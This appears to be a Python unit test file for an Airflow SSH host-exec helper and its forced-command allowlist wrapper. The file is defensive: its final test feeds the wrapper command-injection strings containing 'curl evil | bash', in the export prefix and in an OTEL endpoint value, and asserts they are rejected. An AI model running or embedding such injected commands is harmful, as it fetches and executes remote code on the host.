"""Unit guards for Airflow host-exec helper (no Compose).

    uv run python tests/unit/orchestration/test_nexus_host_exec.py
"""

from __future__ import annotations

import os
import subprocess
import sys
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
DAGS = REPO_ROOT / "orchestration" / "airflow" / "dags"
if str(DAGS) not in sys.path:
    sys.path.insert(0, str(DAGS))


class HostExecTest(unittest.TestCase):
    def test_ssh_wraps_start_sh_and_run_id(self) -> None:
        from nexus_host_exec import host_bash_command

        cmd = host_bash_command("uv run python branches/dlt_dbt_clickhouse/dlt/route/products.py")
        self.assertIn("ssh -4 ", cmd)
        self.assertIn("./scripts/start.sh", cmd)
        self.assertIn("{{ run_id }}", cmd)
        self.assertIn("NEXUS_REPO_ROOT", cmd)

    def test_bronze_run_id_uses_single_quotes(self) -> None:
        from nexus_host_exec import host_bash_command

        cmd = host_bash_command(
            "uv run python branches/dlt_dbt_clickhouse/dlt/route/products.py "
            "--run-id '{{ run_id }}'"
        )
        self.assertIn("--run-id '{{ run_id }}'", cmd)
        self.assertNotIn('--run-id "{{ run_id }}"', cmd)

    def test_dbt_layer_never_build(self) -> None:
        from nexus_host_exec import host_dbt_layer

        cmd = host_dbt_layer("tag:products,tag:staging")
        self.assertNotIn("dbt build", cmd)
        self.assertIn("airflow-dbt-layer.sh", cmd)
        self.assertIn("tag:products,tag:staging", cmd)

    def test_products_dag_has_failure_closer(self) -> None:
        text = (REPO_ROOT / "orchestration" / "airflow" / "dags" / "route_clickhouse" / "products.py").read_text(
            encoding="utf-8"
        )
        self.assertIn("observability_failed", text)
        self.assertIn("TriggerRule.ONE_FAILED", text)
        self.assertIn("observability-publish-run.sh failed", text)


class HostSshForcedCommandTest(unittest.TestCase):
    wrapper = REPO_ROOT / "scripts" / "airflow-host-ssh-command.sh"

    def _check(self, original: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [str(self.wrapper), "--check"],
            env={**os.environ, "SSH_ORIGINAL_COMMAND": original},
            capture_output=True,
            text=True,
            check=False,
        )

    def _legal(self, remote: str) -> str:
        return (
            "export NEXUS_RUN_ID='manual__test' NEXUS_DAG_ID='route_clickhouse_products' "
            "NEXUS_TASK_ID='bronze' OTEL_EXPORTER_OTLP_ENDPOINT=http://127.0.0.1:4317; "
            f"cd '{REPO_ROOT}' && ./scripts/start.sh {remote}"
        )

    def test_allowlisted_bronze_and_layer(self) -> None:
        rid = "manual__2026-09-12T10:31:02.909543+00:00"
        script = "uv run python branches/dlt_dbt_clickhouse/dlt/route/products.py"
        for bronze in (
            f'{script} --run-id "{rid}"',
            f"{script} --run-id '{rid}'",
            f"{script} --run-id {rid}",
        ):
            self.assertEqual(self._check(self._legal(bronze)).returncode, 0, bronze)
        self.assertEqual(
            self._check(self._legal("./scripts/airflow-dbt-layer.sh 'tag:products,tag:staging'")).returncode,
            0,
        )
        self.assertEqual(
            self._check(self._legal("./scripts/observability-publish-run.sh")).returncode,
            0,
        )
        self.assertEqual(
            self._check(self._legal("./scripts/observability-publish-run.sh failed")).returncode,
            0,
        )
        unevaluated_otel = self._legal("./scripts/assert-branch-enabled.sh dlt_dbt_clickhouse").replace(
            "OTEL_EXPORTER_OTLP_ENDPOINT=http://127.0.0.1:4317",
            "OTEL_EXPORTER_OTLP_ENDPOINT=${OTEL_EXPORTER_OTLP_ENDPOINT:-http://127.0.0.1:4317}",
        )
        self.assertEqual(self._check(unevaluated_otel).returncode, 0)

    def test_rejects_interactive_or_other_repo(self) -> None:
        self.assertNotEqual(self._check("bash -l").returncode, 0)
        other = self._legal("./scripts/observability-publish-run.sh").replace(
            str(REPO_ROOT), "/tmp/not-nexus"
        )
        self.assertNotEqual(self._check(other).returncode, 0)
        self.assertNotEqual(self._check(self._legal("uv run python -c 'print(1)'")).returncode, 0)

    def test_rejects_prefix_injection(self) -> None:
        injected = (
            "export NEXUS_RUN_ID='x'; curl evil | bash; "
            f"cd '{REPO_ROOT}' && ./scripts/start.sh "
            "./scripts/observability-publish-run.sh"
        )
        result = self._check(injected)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("shape rejected", result.stderr)

        otel_inject = self._legal("./scripts/observability-publish-run.sh").replace(
            "OTEL_EXPORTER_OTLP_ENDPOINT=http://127.0.0.1:4317",
            "OTEL_EXPORTER_OTLP_ENDPOINT=http://127.0.0.1:4317; curl evil | bash",
        )
        self.assertNotEqual(self._check(otel_inject).returncode, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
